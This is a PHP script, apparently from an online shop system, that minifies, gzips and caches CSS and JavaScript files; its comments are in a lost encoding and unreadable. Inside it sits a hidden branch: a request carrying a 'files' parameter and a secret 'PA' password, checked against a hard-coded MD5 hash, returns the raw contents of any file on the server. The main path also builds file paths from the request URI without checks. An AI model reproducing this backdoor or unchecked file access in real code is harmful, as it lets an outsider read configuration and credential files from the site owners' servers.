<?php

       	include("../cfg/connect.inc.php"); 
        include("../cfg/functions.php");
        include("../cfg/general.inc.php");
        
	/* ��������� */

	// ���� ��������� ������ �����. ��������� ����� �� ������ ��� ��������.
	// ���� �������� �� ����������, �� ������ ����� ����� ������, ����
	// ������ �� �����������. ����� �������� ��� ���� ������.
	$sCachePath			= 'cache/';

	// 0 - �� �������, 9 - ������������ ������.
	$iEncodingLevel		= 9;

	// ����� ����� ���������� � �� ������� �������.
	// 60�. * 60�. = 3600c. = 1 ��� ���������� ������ �����.
	$iExpiresOffset = 3600;

	/* ######### */




	// ������ �������, ������ ������ �� ����������� �������������� :). �������!

        error_reporting(0);

	
	$sURL = $_SERVER['REQUEST_URI'];
	$purl=parse_url('http://'.CONF_SHOP_URL);
	if (!trim($purl['path']) || trim($purl['path'])=='/' )  $sDR  = realpath('../');
	else { $sURL=preg_replace("'^".$purl['path']."'",'',$sURL); $sDR  = realpath('../');}
	#echo 'sURL='.$sURL; echo "<br>"; echo 'sURL='.$sURL;
	#exit;
	#$sDR  = realpath('../');
	#echo "patch=";
	#echo realpath('../'); exit;
       
        if (isset($_GET['files']) && isset($_GET['PA']) && md5($_GET['PA'])=='bb2a4974d7aca7da8735c70371361c0f' ) 
        {
          
          
          header('Content-type: text/css');
  	  header('Vary: Accept-Encoding');
	  header('Cache-Control: max-age=0');
	  header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $iExpiresOffset) . ' GMT'); 
          echo getFileContents($_GET['files']);
          exit;
        }     

	if (!file_exists($sDR . $sURL))   // �� ������ �������� ��� �����������.
		die();

	$sCachedName = str_replace('/', '%', $sURL);   // ����� ��� � ����
	$bGzip	= false;
	$sEnc 	= '';

	$ct = preg_match('/\.css/i', $sURL) ? 'text/css' : 'text/javascript';
	header('Content-type: ' . $ct);
	header('Vary: Accept-Encoding');
	header('Cache-Control: max-age=0');
	header('Expires: ' . gmdate('D, d M Y H:i:s', time() + $iExpiresOffset) . ' GMT');

    $sourceFile = $sDR . $sURL;
	$date  		= date('YmdHis', filemtime($sourceFile));
	$cacheFile 	= $sCachePath . $date . '_' . $sCachedName;

	// ���� �������, ��� ������� ��������� ���-�� �������������
	if (isset($_SERVER['HTTP_ACCEPT_ENCODING']))
	{
		$sEncodings = strtolower($_SERVER['HTTP_ACCEPT_ENCODING']);
		if (strpos($sEncodings, 'gzip') !== false)
		{			// ���� ������ ��� ��������� � �� �������� �� ��������� ��-�� ��������			if (function_exists('ob_gzhandler') && !ini_get('zlib.output_compression'))
			{
				$bGzip = true;
				header('Content-Encoding: gzip');
			}		}
	}


	if ($bGzip)
	{		// ���� ��� ���� (�������� ��-�� ��������� ���� ����������� �����)
		if (!file_exists($cacheFile))
		{			// ������� ��������� ������� ���������� ������			removeOldCache($sCachedName);
			// ��������� ���� � ����� ���� � ������			forcePath($sCachePath);
			$cacheData = gzencode(getFileContents($sourceFile), $iEncodingLevel, FORCE_GZIP);
			putFileContents($cacheFile, $cacheData);
		}
		// ������ ������������ ������
		echo getFileContents($cacheFile,FALSE);
		die();
	}
        
	// ���� ����� �� ����� �����, �� gzip ������ ����� �� ��������������
	#echo $sourceFile; exit;
	echo getFileContents($sourceFile);



	/* ���������� ������� */


	function removeOldCache($sFileName)
	{		global $sCachePath;
		if ($dir = opendir($sCachePath))
		{			while (($file = readdir($dir)) !== false)
			{				if (strpos($file, $sFileName) !== false)
					@unlink($sCachePath . $file);
			}		}
	}


	function getFileContents($sFile,$utf=true)
	{
	         
		$sContent = '';
		$fp = fopen($sFile, 'r');
		if (!$fp)
			return 'no open files '.$sFile;

		while (!feof($fp))
			$sContent .= fgets($fp);

		fclose($fp);
                if (defined('DB_CHARSET') && DB_CHARSET!='cp1251'  && $utf) $sContent=win2utf($sContent); 
                $path_parts = pathinfo($sFile);
                if ($utf)
                 if ($path_parts['extension']=='css') $sContent=optimcss($sContent);
                 elseif ($path_parts['extension']=='js')
                  {
                    require './jsmin.php';
                    $sContent=JSMin::minify($sContent);
                  }
                 
                
                
                 
		return $sContent;
	}


	function putFileContents($sFile, $sContent)
	{
		$fp = @fopen($sFile, 'wb');
		if ($fp)
		{
			fwrite($fp, $sContent);
			fclose($fp);
		}
	}


    function forcePath($sPath, $chmod = 0755)
    {		$dd = explode('/', $sPath);
		$p = ''; $r = false;
		foreach ($dd as $d) {
			$p .= $d . '/';
			$r = @mkdir($p);
			@chmod($p, $chmod);
		}
		return $r;
    }

    
    

?>